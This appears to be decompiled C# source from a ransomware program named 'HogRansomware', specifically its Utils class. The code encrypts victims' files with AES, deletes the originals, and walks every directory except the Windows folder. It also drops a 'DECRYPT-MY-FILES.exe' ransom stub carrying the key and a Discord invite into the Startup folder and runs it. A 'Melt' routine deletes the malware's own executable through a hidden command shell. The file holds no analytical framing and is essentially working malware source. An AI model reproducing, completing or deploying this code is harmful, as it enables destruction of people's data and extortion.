using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using HogRansomware.Properties;

namespace HogRansomware
{
	// Token: 0x02000004 RID: 4
	public class Utils
	{
		// Token: 0x06000006 RID: 6 RVA: 0x0000228C File Offset: 0x0000048C
		public static void EncryptFile(string path)
		{
			try
			{
				if (!path.EndsWith(Settings.Extension))
				{
					if (new FileInfo(path).Length <= Settings.MaxSize)
					{
						using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
						{
							aesCryptoServiceProvider.Key = Convert.FromBase64String(Settings.Key);
							aesCryptoServiceProvider.IV = new byte[]
							{
								120,
								7,
								95,
								52,
								29,
								172,
								50,
								144,
								112,
								17,
								172,
								160,
								236,
								37,
								79,
								166
							};
							using (FileStream fileStream = new FileStream(path, FileMode.Open))
							{
								using (FileStream fileStream2 = File.Create(path + Settings.Extension))
								{
									using (CryptoStream cryptoStream = new CryptoStream(fileStream2, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write))
									{
										fileStream2.Write(aesCryptoServiceProvider.IV, 0, aesCryptoServiceProvider.IV.Length);
										fileStream.CopyTo(cryptoStream);
									}
								}
							}
						}
						File.Delete(path);
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000023AC File Offset: 0x000005AC
		public static string Encrypt(string str)
		{
			try
			{
				using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
				{
					aesCryptoServiceProvider.Key = Convert.FromBase64String(Settings.StringEncryptionKey);
					aesCryptoServiceProvider.IV = new byte[]
					{
						120,
						7,
						95,
						52,
						29,
						172,
						50,
						144,
						112,
						17,
						172,
						160,
						236,
						37,
						79,
						166
					};
					byte[] bytes = Encoding.Unicode.GetBytes(str);
					using (MemoryStream memoryStream = new MemoryStream())
					{
						using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write))
						{
							cryptoStream.Write(bytes, 0, bytes.Length);
							cryptoStream.Close();
						}
						str = Convert.ToBase64String(memoryStream.ToArray());
					}
					return str;
				}
			}
			catch
			{
			}
			return str;
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002488 File Offset: 0x00000688
		public static IEnumerable<string> GetFiles(string path)
		{
			Queue<string> queue = new Queue<string>();
			queue.Enqueue(path);
			while (queue.Count > 0)
			{
				path = queue.Dequeue();
				try
				{
					if (!path.StartsWith("C:\\Windows"))
					{
						foreach (string item in Directory.GetDirectories(path))
						{
							queue.Enqueue(item);
						}
					}
				}
				catch
				{
				}
				string[] array = null;
				try
				{
					array = Directory.GetFiles(path);
				}
				catch
				{
				}
				if (array != null)
				{
					string[] array2 = array;
					for (int j = 0; j < array2.Length; j++)
					{
						string f = array2[j];
						if (!Settings.Exclusions.Any((string x) => f.EndsWith(x)))
						{
							yield return f;
						}
					}
					array2 = null;
				}
			}
			yield break;
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002498 File Offset: 0x00000698
		public static string GenerateKey(int length)
		{
			StringBuilder stringBuilder = new StringBuilder();
			string result;
			using (RNGCryptoServiceProvider rngcryptoServiceProvider = new RNGCryptoServiceProvider())
			{
				byte[] array = new byte[4];
				while (length-- > 0)
				{
					rngcryptoServiceProvider.GetBytes(array);
					uint num = BitConverter.ToUInt32(array, 0);
					stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"[(int)(num % (uint)"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".Length)]);
				}
				result = stringBuilder.ToString();
			}
			return result;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002518 File Offset: 0x00000718
		public static string ParseInvite(string str)
		{
			string result;
			try
			{
				string[] array = (from Match m in Regex.Matches(str, "[a-zA-Z0-9]{2,32}")
				select m.Value).ToArray<string>();
				result = array[array.Count<string>() - 1].ToString();
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002588 File Offset: 0x00000788
		public static void PrepareDecryptor()
		{
			Thread.Sleep(10000);
			try
			{
				string value = "%hog%" + Utils.Encrypt(string.Concat(new string[]
				{
					Settings.Key,
					"%",
					Settings.DiscordInvite,
					"%",
					Settings.Extension
				}));
				byte[] stub = Resources.Stub;
				File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\DECRYPT-MY-FILES.exe", stub);
				Thread.Sleep(500);
				using (FileStream fileStream = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\DECRYPT-MY-FILES.exe", FileMode.Open, FileAccess.ReadWrite, FileShare.None))
				{
					using (BinaryWriter binaryWriter = new BinaryWriter(fileStream))
					{
						fileStream.Position = fileStream.Length + 1L;
						binaryWriter.Write(value);
					}
				}
				Thread.Sleep(500);
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\DECRYPT-MY-FILES.exe");
			}
			catch
			{
			}
		}

		// Token: 0x0600000C RID: 12 RVA: 0x000026A4 File Offset: 0x000008A4
		public static void Melt()
		{
			ProcessStartInfo startInfo = null;
			try
			{
				startInfo = new ProcessStartInfo
				{
					Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					FileName = "cmd.exe"
				};
			}
			catch
			{
			}
			finally
			{
				Process.Start(startInfo);
				Environment.Exit(0);
			}
		}
	}
}
